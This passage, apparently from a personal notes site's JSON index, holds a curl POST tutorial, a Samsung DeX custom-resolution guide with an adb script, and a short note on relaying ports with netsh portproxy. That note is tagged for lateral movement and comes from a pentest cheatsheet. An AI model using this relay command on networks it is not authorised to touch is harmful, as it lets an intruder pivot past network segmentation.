style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The &lt;code&gt;--data&lt;/code&gt; parameter can also be specified multiple times (mostly for readability), in which case you’d normally want to have a single parameter/value pair for each instance.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;curl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --request&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; POST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;parameter1=value1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;parameter2=value2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;            &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://web.site/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;By default, curl sends data with the &lt;code&gt;Content-Type: application/x-www-form-urlencoded&lt;/code&gt;. &lt;a href=&quot;https://www.educative.io/edpresso/how-to-perform-a-post-request-using-curl&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;If you need to change the content type (for example, you frequently need to send &lt;code&gt;Content-Type: application/json&lt;/code&gt; with JSON data) or need to specify additional headers (frequently for authentication), then you can use the &lt;code&gt;--header&lt;/code&gt; parameter.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;curl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --request&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; POST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --header&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;User-Token: XXXXXX&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;parameter1=value1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;parameter2=value2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;            &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://web.site/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Like &lt;code&gt;--data&lt;/code&gt;, the &lt;code&gt;--header&lt;/code&gt; parameter can be specified multiple times for multiple headers, and will smartly override curl’s defaults.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;curl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --request&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; POST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --header&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;User-Token: XXXXXX&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --header&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Username: My User&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;parameter1=value1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;parameter2=value2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;            &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://web.site/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Because responses are often served up in a compact fashion, they’re often a bit hard to read. The jq command’s default filter (&lt;code&gt;.&lt;/code&gt;) just pretty-prints (and colorizes!) JSON, which can make interpreting the API’s response much easier.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;curl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --request&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; POST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --header&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;User-Token: XXXXXX&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --header&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Username: My User&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;parameter1=value1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;parameter2=value2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;            &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;https://web.site/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; jq&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; .&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Use-the-Windows-Firewall-to-relay-ports":{"slug":"spells/Use-the-Windows-Firewall-to-relay-ports","filePath":"spells/Use the Windows Firewall to relay ports.md","title":"Use the Windows Firewall to relay ports","links":[],"tags":["OS/Windows/Firewall","AttackCycle/LateralMovement","HowTo","Application/netsh"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from slyth11907 / Cheatsheets / Cheatsheet_UsefulCommands.txt.\n\n\n\nnetsh interface portproxy add v4tov4 `\n      listenport=$LOCAL_PORT listenaddress=0.0.0.0 `\n      connectport=$REMOTE_PORT connectaddress=$REMOTE_IP\nThis works on Windows 7 and later.","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_UsefulCommands.txt#L14&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;slyth11907 / Cheatsheets / Cheatsheet_UsefulCommands.txt&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;netsh interface portproxy add v4tov4 &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;      listenport&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;LOCAL_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; listenaddress&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0.0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0.0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;      connectport&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;REMOTE_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; connectaddress&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;REMOTE_IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This works on Windows 7 and later.&lt;/p&gt;"},"spells/Use-unsupported-display-resolutions-with-Samsung-DeX":{"slug":"spells/Use-unsupported-display-resolutions-with-Samsung-DeX","filePath":"spells/Use unsupported display resolutions with Samsung DeX.md","title":"Use unsupported display resolutions with Samsung DeX","links":[],"tags":["HowTo","OS/Android","Application/SamsungDeX","Application/GoodLock","Application/ADB"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nThe options below are known to work on Android 14 / Samsung One UI 6.\n\n\n\nSamsung DeX (the desktop mode available on higher-end Samsun Android smartphones) can be used with a limited number of (fairly standard) resolutions out-of-the-box. It is possible to use DeX with other resolutions however.\nGood Lock\nSamsung provides a application, Good Lock,  that unlocks a number of customizations for Samsung’s version of Android. The MultiStar plugin can be used to enable additional display resolutions under DeX by turning on I ❤️ Samsun DeX → High resolutions for external displays.\nADB\nThe resolutions unlocked by Good Lock will work on the vast majority of modern display. However, occasionally you may want to use a monitor with an “oddball” resolution (like the 2240 × 1400 resolution used by the Lenovo ThinkVision M14d). The Android Debugging Bridge (adb) utility can be used in many of these cases.\nInitial setup\n\nInstall F-Droid.\nInstall Termux.\nInstall adb: pkg install android-tools\nEnable wireless debugging by turning on Developer options → Wireless debugging.\nSelect “Pair device with pairing code”. Note down the pairing code and port displayed in the resulting pop-up. (Note that this port is different than the debugging port!)\nPair adb in Termux with the phone: adb pair localhost:$PAIRING_PORT.\n\nSetting a custom resolution\n\nEnable wireless debugging (if it’s not already enabled from the previous section) by turning on Developer options → Wireless debugging. Note down the port displayed under “IP address &amp; Port”.\nConnect adb: adb connect localhost:$DEBUGGING_PORT\nUse adb to set the resolution of your external display: adb shell wm size 2240x1400 -d 2\nDisconnect adb: adb disconnect\nDisabled wireless debugging.\n\n\n\n                  \n                  Tip\n                  \n                \n\n\nIn general, the Android phone itself will use display 0. To determine the number of the external display, you can output the current resolution of a display using adb shell wm size -d #, where # is 0, 1, 2, …\n\n\n\n\n\n                  \n                  Warning\n                  \n                \n\n\nThe display resolution set with adb shell wm size will stick until either a new display resolution is set using adb, adb shell wm size reset -d2 (or whatever the correct display number) is run, or until a new resolution is manually chosen in the Settings app under Samsun DeX → Display resolution.\n\n\n\nAutomatic resolution switcher script\nThe script below should (perhaps with minor modifications) automatically set DeX’s resolution to the optimal one for your external monitor.\nPrerequisites\n\nTurn on Developer options → Quick settings developer tiles → Wireless debugging. This will enable you to quickly turn wireless debugging on and off.\nInstall Termux, android-tools, and then pair (your local) adb with your (local) device using the steps described above in “Initial setup”.\nGrant Termux permission to read the Android system logs: adb shell pm grant com.termux android.permission.READ_LOGS\nReboot your device.\n\nSwitcher script\n\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from Set max resolution for external displays Tasker task.\n\n\n\n#!/usr/bin/env bash\n \nDISPLAY_NAME=&quot;HDMI Screen&quot;\nDISPLAY_NUMBER=2\n \n# Exit on error\nset -e\n \n# Get local adb port\nPORT=$(logcat -d | grep &#039;adbwifi&#039; | tail -n 1 | sed &#039;s/.* //&#039;)\n \n# Locally connect to the wireless debugging port\nadb connect localhost:$PORT\n \n# Get the connected display&#039;s highest resolution\nDISPLAY_RESOLUTION=&quot;$(adb shell dumpsys display | grep -m 1 &quot;$DISPLAY_NAME&quot; | awk -F&#039; |=&#039; &#039;/width/ &amp;&amp; /height/ {for(i=1;i&lt;=NF;i++) if($i==&quot;width&quot;) print $(i+1) &quot;x&quot; $(i+3)}&#039; | tr -d &#039;,&#039; | sort -nr -k1,1 -k2,2 | head -n 1)&quot;\n \n# Set the resolution for DeX\nadb shell wm size $DISPLAY_RESOLUTION -d $DISPLAY_NUMBER\n \n# Disconnect adb\nadb disconnect\n \n# Notify the user\nMESSAGE=&quot;$DISPLAY_NAME ($DISPLAY_NUMBER) set to $DISPLAY_RESOLUTION&quot;\nif [[ $(which termux-notification | wc -l) -gt 0 ]]; then\n        termux-notification --icon monitor --title &quot;Samsung DeX&quot; --content &quot;$MESSAGE&quot;\nfi\necho &quot;$MESSAGE&quot;\n\n\n                  \n                  Note\n                  \n                \n\n\nThis will (often) generate a popup asking you to confirm log access when run.\n\n\n\n\n\n                  \n                  Important\n                  \n                \n\n\nThere is unfortunately no way to enable local adb in non-rooted devices without a WiFi connection.\n\n\n\n\n\n                  \n                  Warning\n                  \n                \n\n\nOn-screen text will sometimes look terrible after switching resolutions for some combinations of cables/monitors, even when the same device/cable/monitor works fine on a different combination!\n\n\n","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;The options below are known to work on Android 14 / Samsung One UI 6.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;&lt;a href=&quot;https://www.samsung.com/us/apps/dex/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Samsung DeX&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (the desktop mode available on higher-end Samsun Android smartphones) can be used with a limited number of (fairly standard) resolutions out-of-the-box. It is possible to use DeX with other resolutions however.&lt;/p&gt;\n&lt;h2 id=&quot;good-lock&quot;&gt;Good Lock&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#good-lock&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Samsung provides a application, &lt;a href=&quot;https://galaxystore.samsung.com/detail/com.samsung.android.goodlock&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Good Lock&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;,  that unlocks a number of customizations for Samsung’s version of Android. The &lt;a href=&quot;https://galaxystore.samsung.com/detail/com.samsung.android.multistar&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;MultiStar&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; plugin can be used to enable additional display resolutions under DeX by turning on &lt;strong&gt;I ❤️ Samsun DeX → High resolutions for external displays&lt;/strong&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;adb&quot;&gt;ADB&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#adb&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The resolutions unlocked by Good Lock 